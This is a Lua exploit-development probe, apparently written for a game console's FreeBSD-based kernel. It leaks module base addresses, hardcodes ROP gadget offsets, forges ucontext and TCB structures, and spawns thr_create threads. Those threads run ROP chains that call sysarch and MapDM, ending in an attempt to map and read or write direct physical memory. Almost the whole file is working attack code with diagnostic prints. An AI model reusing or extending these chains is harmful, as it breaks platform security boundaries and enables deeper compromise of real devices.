-- CRASH_CLASS: MODERATE
-- PROBE 546b: thr_create diagnostic — isolate why 546a crashed
--
-- 546a crashed immediately at thr_create with binary output.
-- This probe tests in stages:
--   Stage 1: thr_create with trivial chain (jmp_self only) → verify thr_create works
--   Stage 2: thr_create with sysarch+spin → verify fake TCB setup works
--   Stage 3: full MapDM chain (same as 546a)

print("=== PROBE 546b: thr_create DIAGNOSTIC ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_thr_kill = make_syscall(433)
local syscall_ret = syscall.pipe.fn_addr

-- ── Address discovery ──────────────────────────────────────────────
local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print("EBOOT: " .. q(eboot))

zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0x2001), info) end)
local lk_lo = rd(info + 0x108) or 0
local lk_hi = rd(info + 0x10C) or 0
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print("LIBKERNEL: " .. q(lk))
print("FN_ADDR: " .. q(syscall_ret))

local pop_rax_ret     = eboot + uint64(0x992)
local pop_rdi_ret     = eboot + uint64(0xC9DFE)
local pop_rsi_ret     = eboot + uint64(0xD77D)
local pop_rdx_ret     = eboot + uint64(0x3B02D7)
local pop_rcx_ret     = eboot + uint64(0xE64)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self        = eboot + uint64(0x15481)
local bare_ret        = eboot + uint64(0x42)

-- ════════════════════════════════════════════════════════════════════
-- STAGE 1: Trivial thr_create — child just spins at jmp_self
-- This verifies the basic thr_create mechanism + ucontext gates work.
-- ════════════════════════════════════════════════════════════════════
print("")
print("═══ STAGE 1: trivial thr_create (jmp_self) ═══")

local stk1 = nil
local ok_s1 = pcall(function()
    stk1 = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print("  stack=" .. q(stk1))

-- RSP for trivial child: just needs a valid stack page
-- RIP = jmp_self (child spins forever)
local ctx1 = memory.alloc(0x500)
zero(ctx1, 0x4C0)

-- Gates
wq(ctx1 + 0x108, uint64(0x480))
wd(ctx1 + 0x0D0, 0)
wq(ctx1 + 0x110, uint64(0x10000))

-- Segment registers
wq(ctx1 + 0x0C0, uint64(0x43))    -- CS
wq(ctx1 + 0x100, uint64(0x3B))    -- SS
wq(ctx1 + 0x0F0, uint64(0x202))   -- RFLAGS

-- RIP = jmp_self, RSP = middle of stack
local rsp1 = stk1 + 0x100000  -- 1MB into 2MB stack
wq(ctx1 + 0x0E0, jmp_self)
wq(ctx1 + 0x0F8, rsp1)

print("  RIP=" .. q(jmp_self) .. " (jmp_self)")
print("  RSP=" .. q(rsp1))

-- Verify ucontext values were written
local v_cs = rq(ctx1 + 0x0C0)
local v_rip = rq(ctx1 + 0x0E0)
local v_rsp = rq(ctx1 + 0x0F8)
local v_gate = rq(ctx1 + 0x108)
print("  verify: CS=" .. q(v_cs) .. " RIP=" .. q(v_rip))
print("  verify: RSP=" .. q(v_rsp) .. " gate108=" .. q(v_gate))

print("  CALLING thr_create(430)...")
local tid1_buf = memory.alloc(8)
wq(tid1_buf, uint64(0))
local ok1, rv1 = pcall(function()
    return sc_430(uint64(ctx1), uint64(tid1_buf), uint64(0))
end)
local rv1_n = ok1 and to_num(rv1) or -999
local tid1 = rq(tid1_buf)
print("  RESULT: ok=" .. tostring(ok1) .. " rv=" .. rv1_n .. " tid=" .. q(tid1))

if rv1_n ~= 0 then
    print("  STAGE 1 FAILED — thr_create rejected context")
    print("  (trying thr_kill to check if tid was written anyway)")
    if tid1 and to_num(tid1) > 0 then
        local ok_k, kv = pcall(function()
            return sc_thr_kill(uint64(to_num(tid1)), uint64(0))
        end)
        print("  thr_kill(" .. q(tid1) .. ",0)=" .. (ok_k and to_num(kv) or "ERR"))
    end
    print("=== 546b DONE (stage 1 failed) ===")
    return
end

print("  STAGE 1 OK — child thread spinning")

-- Verify child is alive: thr_kill(tid, 0) should return 0
local ok_alive, alive_rv = pcall(function()
    return sc_thr_kill(uint64(to_num(tid1)), uint64(0))
end)
print("  thr_kill(tid,0)=" .. (ok_alive and to_num(alive_rv) or "ERR"))

-- ════════════════════════════════════════════════════════════════════
-- STAGE 2: thr_create with sysarch(SET_FSBASE) + done marker + spin
-- Tests: ROP chain execution + fake TCB in child thread
-- ════════════════════════════════════════════════════════════════════
print("")
print("═══ STAGE 2: sysarch + done marker ═══")

-- Fresh stack and shared page
local stk2, shared2
pcall(function()
    stk2 = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
pcall(function()
    shared2 = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared2, 0x40)
wq(shared2, uint64(0xDEAD))  -- sentinel

-- Fake TCB
local tcb2_page
pcall(function()
    tcb2_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb2_page + off, tcb2_page) end
local tcb2_ptr = memory.alloc(8)
wq(tcb2_ptr, tcb2_page)
print("  stack=" .. q(stk2) .. " shared=" .. q(shared2))
print("  tcb=" .. q(tcb2_page))

-- Chain: sysarch(SET_FSBASE) → write done marker → spin
local chain2 = stk2 + 0x200000 - 0x800
local i2 = 0
local function emit2(v) wq(chain2 + i2, v); i2 = i2 + 8 end

-- sysarch(165, SET_FSBASE=129, &tcb_ptr)
emit2(uint64(165))     -- rax
emit2(pop_rdi_ret)
emit2(uint64(129))     -- AMD64_SET_FSBASE
emit2(pop_rsi_ret)
emit2(tcb2_ptr)
emit2(syscall_ret)

-- Write "DONE" to shared[0]
emit2(pop_rdi_ret)
emit2(shared2)
emit2(pop_rax_ret)
emit2(uint64(0x444F4E45))  -- "DONE"
emit2(mov_rdi_rax_ret)

-- Park
emit2(jmp_self)

print("  chain: " .. (i2/8) .. " entries at " .. q(chain2))

-- Verify chain was written
local c2_0 = rq(chain2)
local c2_8 = rq(chain2 + 8)
print("  chain[0]=" .. q(c2_0) .. " (expect 0xA5=165)")
print("  chain[8]=" .. q(c2_8) .. " (expect pop_rdi_ret)")

-- Build ucontext
local ctx2 = memory.alloc(0x500)
zero(ctx2, 0x4C0)
wq(ctx2 + 0x108, uint64(0x480))
wd(ctx2 + 0x0D0, 0)
wq(ctx2 + 0x110, uint64(0x10000))
wq(ctx2 + 0x0C0, uint64(0x43))
wq(ctx2 + 0x100, uint64(0x3B))
wq(ctx2 + 0x0F0, uint64(0x202))
wq(ctx2 + 0x0E0, pop_rax_ret)
wq(ctx2 + 0x0F8, chain2)

print("  RIP=" .. q(pop_rax_ret) .. " RSP=" .. q(chain2))
print("  CALLING thr_create...")

local tid2_buf = memory.alloc(8)
wq(tid2_buf, uint64(0))
local ok2, rv2 = pcall(function()
    return sc_430(uint64(ctx2), uint64(tid2_buf), uint64(0))
end)
local rv2_n = ok2 and to_num(rv2) or -999
local tid2 = rq(tid2_buf)
print("  RESULT: ok=" .. tostring(ok2) .. " rv=" .. rv2_n .. " tid=" .. q(tid2))

if rv2_n ~= 0 then
    print("  STAGE 2 FAILED — thr_create rejected")
    print("=== 546b DONE (stage 2 failed) ===")
    return
end

-- Poll shared page for done marker (500ms max)
local sleep_buf = memory.alloc(16)
wq(sleep_buf, uint64(0))
wq(sleep_buf + 8, uint64(50000000))  -- 50ms

local found2 = false
for attempt = 1, 10 do
    pcall(function() sc_nanosleep(uint64(sleep_buf), uint64(0)) end)
    local marker = rq(shared2)
    if marker then
        local mn = to_num(marker)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn == 0x444F4E45 then
            found2 = true
            print("  DONE marker found after " .. (attempt * 50) .. "ms")
            break
        end
    end
end

if not found2 then
    local raw = rq(shared2)
    print("  TIMEOUT — shared[0]=" .. (raw and q(raw) or "nil") .. " (expected 0x444F4E45)")
    print("  Child may have crashed before writing marker")
else
    print("  STAGE 2 OK — child executed sysarch + wrote done marker")
end

-- ════════════════════════════════════════════════════════════════════
-- STAGE 3: Full MapDM chain (same as 546a but only if stages 1+2 pass)
-- ════════════════════════════════════════════════════════════════════
if not found2 then
    print("")
    print("═══ STAGE 3 SKIPPED (stage 2 failed) ═══")
    print("=== 546b DONE ===")
    return
end

print("")
print("═══ STAGE 3: MapDM from child ═══")

local map_fn = lk + uint64(0x15020)
local alloc_fn = lk + uint64(0x17EF0)

-- AllocateDirectMemory
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
local ok_a, arv = pcall(function()
    return native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local arv_n = ok_a and to_num(arv) or -1
local phys = rq(phys_out)
print("  AllocDM: rv=" .. arv_n .. " phys=" .. q(phys))

if not phys or to_num(phys) == 0 then
    print("  FATAL: AllocDM failed")
    print("=== 546b DONE ===")
    return
end

-- Fresh resources for stage 3
local stk3, shared3, tcb3_page
pcall(function()
    stk3 = sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
pcall(function()
    shared3 = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared3, 0x40)
wq(shared3 + 0x00, uint64(0xAAAA0003))
wq(shared3 + 0x08, uint64(0xBBBB0003))
wq(shared3 + 0x10, uint64(0))

pcall(function()
    tcb3_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
for off = 0, 0x100, 8 do wq(tcb3_page + off, tcb3_page) end
local tcb3_ptr = memory.alloc(8)
wq(tcb3_ptr, tcb3_page)

print("  stack=" .. q(stk3) .. " shared=" .. q(shared3))

-- Build MapDM chain
local chain3 = stk3 + 0x200000 - 0x800
local i3 = 0
local function emit3(v) wq(chain3 + i3, v); i3 = i3 + 8 end

-- sysarch(SET_FSBASE)
emit3(uint64(165))
emit3(pop_rdi_ret)
emit3(uint64(129))
emit3(pop_rsi_ret)
emit3(tcb3_ptr)
emit3(syscall_ret)

-- MapDM(shared3, 0x4000, 3, 0, phys, 0x4000)
emit3(pop_rdi_ret)
emit3(shared3)               -- virt_out → shared3[0]
emit3(pop_rsi_ret)
emit3(uint64(0x4000))        -- len
emit3(pop_rdx_ret)
emit3(uint64(3))             -- prot = PROT_RW
emit3(pop_rcx_ret)
emit3(uint64(0))             -- flags
emit3(map_fn)                -- call MapDM

-- Store rv → shared3[0x08]
emit3(pop_rdi_ret)
emit3(shared3 + 0x08)
emit3(mov_rdi_rax_ret)

-- Done marker → shared3[0x10]
emit3(pop_rdi_ret)
emit3(shared3 + 0x10)
emit3(pop_rax_ret)
emit3(uint64(0x444F4E45))
emit3(mov_rdi_rax_ret)

-- Park
emit3(jmp_self)

print("  chain: " .. (i3/8) .. " entries")

-- ucontext with R8=phys, R9=align
local ctx3 = memory.alloc(0x500)
zero(ctx3, 0x4C0)
wq(ctx3 + 0x108, uint64(0x480))
wd(ctx3 + 0x0D0, 0)
wq(ctx3 + 0x110, uint64(0x10000))
wq(ctx3 + 0x0C0, uint64(0x43))
wq(ctx3 + 0x100, uint64(0x3B))
wq(ctx3 + 0x0F0, uint64(0x202))
wq(ctx3 + 0x0E0, pop_rax_ret)
wq(ctx3 + 0x0F8, chain3)
wq(ctx3 + 0x068, phys)            -- R8 = phys_addr
wq(ctx3 + 0x070, uint64(0x4000))  -- R9 = alignment

print("  R8(phys)=" .. q(phys) .. " R9=0x4000")
print("  CALLING thr_create...")

local tid3_buf = memory.alloc(8)
wq(tid3_buf, uint64(0))
local ok3, rv3 = pcall(function()
    return sc_430(uint64(ctx3), uint64(tid3_buf), uint64(0))
end)
local rv3_n = ok3 and to_num(rv3) or -999
local tid3 = rq(tid3_buf)
print("  RESULT: ok=" .. tostring(ok3) .. " rv=" .. rv3_n .. " tid=" .. q(tid3))

if rv3_n ~= 0 then
    print("  STAGE 3 thr_create FAILED")
    print("=== 546b DONE ===")
    return
end

-- Poll for done
local found3 = false
for attempt = 1, 50 do
    pcall(function() sc_nanosleep(uint64(sleep_buf), uint64(0)) end)
    local marker = rq(shared3 + 0x10)
    if marker then
        local mn = to_num(marker)
        if mn < 0 then mn = mn + 0x100000000 end
        if mn == 0x444F4E45 then
            found3 = true
            print("  DONE after " .. (attempt * 50) .. "ms")
            break
        end
    end
end

if not found3 then
    -- Dump shared page for analysis
    print("  TIMEOUT — dumping shared page:")
    for off = 0, 0x18, 8 do
        local v = rq(shared3 + off)
        print("    +" .. string.format("%02X", off) .. "=" .. (v and q(v) or "nil"))
    end
    print("=== 546b DONE (stage 3 timeout) ===")
    return
end

-- Read results
local child_virt = rq(shared3)
local child_rv = rq(shared3 + 0x08)
local child_rv_n = child_rv and to_num(child_rv) or -1
if child_rv_n < 0 then child_rv_n = child_rv_n + 0x100000000 end

print("  MapDM rv=" .. string.format("0x%X", child_rv_n))
print("  virt=" .. (child_virt and q(child_virt) or "nil"))

if child_rv_n == 0 and child_virt then
    print("")
    print("*** MapDM SUCCEEDED! ***")
    local ok_wr = pcall(function() memory.write_dword(child_virt, 0xDEADBEEF) end)
    if ok_wr then
        local rb = rd(child_virt)
        if rb then
            if rb < 0 then rb = rb + 0x100000000 end
            print("  WRITE+READ: 0x" .. string.format("%08X", rb))
            if rb == 0xDEADBEEF then
                print("*** R/W CONFIRMED — PHYSICAL MEMORY MAPPED ***")
            end
        else
            print("  READ FAULT after write")
        end
    else
        print("  WRITE FAULT — VA not in main thread map?")
        local rb = rd(child_virt)
        print("  READ-ONLY: " .. (rb and string.format("0x%08X", rb < 0 and rb + 0x100000000 or rb) or "FAULT"))
    end
else
    print("  MapDM failed or no output")
end

print("")
print("=== 546b DONE ===")
